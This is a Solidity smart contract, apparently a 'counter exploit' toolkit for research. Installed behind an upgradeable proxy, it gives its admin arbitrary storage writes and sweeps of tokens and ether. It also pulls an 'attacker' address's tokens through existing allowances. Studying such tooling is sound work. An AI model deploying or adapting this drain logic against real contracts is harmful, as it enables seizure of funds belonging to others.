// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "lib/solmate/src/tokens/ERC20.sol";

error Initialized();
error Unauthorized();
error LengthMismatch();
error InsufficientBalance();
error InsufficientAllowance();

/// @title Counter Exploit Contract.
/// @author jtriley.eth
/// @notice FOR RESEARCH PURPOSES ONLY!
/// @dev This contract can be upgraded to by an upgradeable proxy, which enables arbitrary storage
/// writes, token transfers, and ether transfers.
contract CounterExploit {
    modifier onlyAdmin() {
        if (msg.sender != admin()) revert Unauthorized();
        _;
    }

    /// @notice Returns the admin storage slot.
    /// @dev Computed as: `uint256(keccak256("counter-exploit-toolkit.admin")) - 1`.
    bytes32 public constant adminSlot =
        0x1b681a0f4a91c141cc6ef34e55895f703d1ef56884d08c0fb5c6bc79a29fec42;

    /// @notice Initializer, callable once, sets the admin address.
    function initialize() public {
        if (admin() != address(0)) revert Initialized();
        assembly {
            sstore(adminSlot, caller())
        }
    }

    /// @notice Returns the admin address.
    function admin() public view returns (address _admin) {
        assembly {
            _admin := sload(adminSlot)
        }
    }

    /// @notice Writes a value to storage.
    /// @dev Reverts if caller is not admin.
    /// @param slot The storage slot to write to.
    /// @param value The value to write.
    function write(bytes32 slot, bytes32 value) public onlyAdmin {
        assembly {
            sstore(slot, value)
        }
    }

    /// @notice Batch writes values to storage.
    /// @dev Reverts if caller is not admin.
    /// @param slots The storage slots to write to.
    /// @param values The values to write.
    function writeBatch(bytes32[] calldata slots, bytes32[] calldata values)
        public
        onlyAdmin
    {
        unchecked {
            uint256 len = slots.length;
            if (len != values.length) revert LengthMismatch();
            for (uint256 i; i < slots.length; ++i) {
                write(slots[i], values[i]);
            }
        }
    }

    /// @notice Transfers tokens from this address to a receiver.
    /// @dev Reverts if caller is not admin.
    /// @param receiver The address to transfer tokens to.
    /// @param token The token to transfer.
    /// @param amount The amount of tokens to transfer.
    function takeToken(
        address receiver,
        ERC20 token,
        uint256 amount
    ) public onlyAdmin {
        token.transfer(receiver, amount);
    }

    /// @notice Batch transfers tokens from this address to a receiver.
    /// @dev Reverts if caller is not admin.
    /// @param receiver The address to transfer tokens to.
    /// @param tokens The tokens to transfer.
    /// @param amounts The amounts of tokens to transfer.
    function takeTokenBatch(
        address receiver,
        ERC20[] calldata tokens,
        uint256[] calldata amounts
    ) public onlyAdmin {
        unchecked {
            uint256 len = tokens.length;
            if (len != amounts.length) revert LengthMismatch();
            for (uint256 i; i < len; ++i) {
                takeToken(receiver, tokens[i], amounts[i]);
            }
        }
    }

    /// @notice Transfers ether to a receiver.
    /// @dev Reverts if caller is not admin.
    /// @param receiver The address to transfer ether to.
    /// @param amount The amount of ether to transfer.
    /// @return success True if the transfer succeeded (used to remove solc warning).
    function takeEther(address receiver, uint256 amount) public onlyAdmin returns (bool success) {
        (success, ) = payable(receiver).call{value: amount}("");
    }

    /// @notice Transfers tokens from the attacker to a receiver.
    /// @dev Reverts if caller is not admin. Gets the attacker's balance and allowance and transfers
    /// the lesser of the two.
    /// @param attacker The address to trasnfer tokens from.
    /// @param receiver The address to transfer tokens to.
    /// @param token The token to transfer.
    /// @param amount The amount of tokens to transfer.
    function stealToken(
        address attacker,
        address receiver,
        ERC20 token,
        uint256 amount
    ) public onlyAdmin {
        if (amount > token.balanceOf(attacker)) revert InsufficientBalance();
        if (amount > token.allowance(attacker, address(this))) revert InsufficientAllowance();
        token.transferFrom(attacker, receiver, amount);
    }

    /// @notice Batch transfers tokens from the attacker to a receiver.
    /// @dev Reverts if caller is not admin.
    /// @param receiver The address to transfer tokens to.
    /// @param tokens The tokens to transfer.
    /// @param amounts The amounts of tokens to transfer.
    function stealTokenBatch(
        address attacker,
        address receiver,
        ERC20[] calldata tokens,
        uint256[] calldata amounts
    ) public onlyAdmin {
        unchecked {
            uint256 len = tokens.length;
            if (len != amounts.length) revert LengthMismatch();
            for (uint256 i; i < len; ++i) {
                stealToken(attacker, receiver, tokens[i], amounts[i]);
            }
        }
    }

    /// @notice Receives any amount of Ether without taking action.
    receive() external payable {}
}
